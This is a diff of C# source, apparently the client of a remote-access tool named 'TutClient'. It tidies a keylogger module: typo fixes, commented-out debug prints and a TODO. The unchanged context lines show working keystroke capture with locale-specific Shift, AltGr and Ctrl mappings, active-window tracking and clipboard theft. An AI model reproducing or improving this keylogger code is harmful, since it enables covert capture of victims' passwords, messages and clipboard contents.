@@ -103,10 +103,10 @@ namespace TutClient
                             }
                         }
                         else if (Clipboard.ContainsText()) result = "System.String [Clipboard Data is Text]\nText:\n" + Clipboard.GetText(); //Clipboard is text
-                        else result = "Clipboard Data Not Retrived!\nPerhaps no data is selected when ctrl+c was pressed :("; //No clibpoard data
+                        else result = "Clipboard Data Not Retrived!\nPerhaps no data was selected when ctrl+c was pressed :("; //No clibpoard data
                         /*IDataObject obj = Clipboard.GetDataObject(); //Get the data object of the clipboard
                         string text = obj.GetData(DataFormats.Text).ToString(); //Get the text data in the clipboard*/
-                        Console.WriteLine("Clipboard function done :)");
+                        //Console.WriteLine("Clipboard function done :)");
 
                         //Console.WriteLine("data clipboard: " + Clipboard.GetData("%s").ToString());
                     }
@@ -159,7 +159,7 @@ namespace TutClient
         private static void Setup()
         {
             //Shift, Alt Gr, Control, Default Modifiers may be different per locales/countries :(
-            //al.Add is for keys without modifiers(ex. no shift or alt gr or controlr is held while the keys was pressed)
+            //al.Add is for keys without modifiers(ex. no shift or alt gr or control is held while the keys was pressed)
             //sf.Add is for keys when the SHIFT modifier is held while the key was pressed
             //ag.Add is for keys when the ALT GR modifier is held while the key was pressed
             //ct.Add is for keys when the CTRL modifiers is held while the key was pressed
@@ -240,7 +240,7 @@ namespace TutClient
             al.Add(Keys.Up, " [ARROW, UP] ");
             al.Add(Keys.NumLock, " [Num Lock, state: " + "<rtd.state>" + "] ");
 
-            //ALT GR Keys different per country (more countries may supported by default in a newer version)
+            //ALT GR Keys different per country (more countries may be supported by default in a newer version)
             ag.Add(Keys.S, "đ");
             ag.Add(Keys.F, "[");
             ag.Add(Keys.G, "]");
@@ -333,23 +333,23 @@ namespace TutClient
                         if (al.ContainsKey((Keys)i)) //Check if default overrides apply to this key
                         {
                             append = al[(Keys)i]; //Get the override string
-                            Console.WriteLine("Updating Append!");
+                            //Console.WriteLine("Updating Append!");
                             append = UpdateRealTimeData((Keys)i, append); //Update the changing data labels
                             if (sf.ContainsKey((Keys)i) && shiftHeld) //Check if we need to do shift overrides
                             {
                                 append = sf[(Keys)i]; //Apply the shift overrides to the key
-                                Console.WriteLine("Shift override applied to text");
+                                //Console.WriteLine("Shift override applied to text");
                             }
                             if (ag.ContainsKey((Keys)i) && altgrHeld) //Check if we need to do altgr overrides
                             {
                                 append = ag[(Keys)i]; //Apply the altgr override to the key
-                                Console.WriteLine("Alt Gr override applied to text");
+                                //Console.WriteLine("Alt Gr override applied to text");
                             }
                             if (ct.ContainsKey((Keys)i) && ctrlHeld && !altgrHeld) //Check if we need to do control overrides
                             {
                                 append = ct[(Keys)i]; //Apply control overrides to the key
                                 append = UpdateRealTimeData((Keys)i, append); //Load real time data to the result
-                                Console.WriteLine("Ctrl override applied to text");
+                                //Console.WriteLine("Ctrl override applied to text");
                             }
                         }
                         else //Not in override list
@@ -357,7 +357,7 @@ namespace TutClient
                             append = ""; //Set it to empty
                         }
 
-                        if (LastWindow == GetActiveWindowTitle()) //If the focused window isn't changed since the last loop
+                        if (LastWindow == GetActiveWindowTitle()) //If the focused window hasn't changed since the last loop
                         {
                             if (append != "") //If append isn't empty
                             {
@@ -370,11 +370,11 @@ namespace TutClient
                                 if (!Control.IsKeyLocked(Keys.CapsLock) && !shiftHeld) //Key is lower caps is off and no shift is held
                                 {
                                     currentKey = currentKey.ToLower(); //Convert to lower
-                                    Console.WriteLine("Key is lower");
+                                    //Console.WriteLine("Key is lower");
                                 }
                                 else //Should be capital?
                                 {
-                                    Console.WriteLine("Caps: " + (Control.IsKeyLocked(Keys.CapsLock)).ToString());
+                                    //Console.WriteLine("Caps: " + (Control.IsKeyLocked(Keys.CapsLock)).ToString());
                                 }
 
                                 if (currentKey.ToLower().Contains("shift") || currentKey.ToLower().Contains("menu") || currentKey.ToLower().Contains("control")) //Supress the adding of modifier keys without other key
@@ -404,7 +404,7 @@ namespace TutClient
                                         Console.WriteLine("Ctrl override applied to text /normal text/");
                                     }
 
-                                    KeyLog = KeyLog + currentKey; //Append the result to the keylog
+                                    KeyLog += currentKey; //Append the result to the keylog
                                 }
                             }
 
@@ -420,7 +420,7 @@ namespace TutClient
                             }
                             else
                             {
-                                //Same functionallity as above (should implement a function for it)
+                                // TODO: Same functionallity as above (should implement a function for it)
 
                                 string currentKey = Convert.ToString((Keys)i);
                                 if (!Control.IsKeyLocked(Keys.CapsLock) && !shiftHeld)
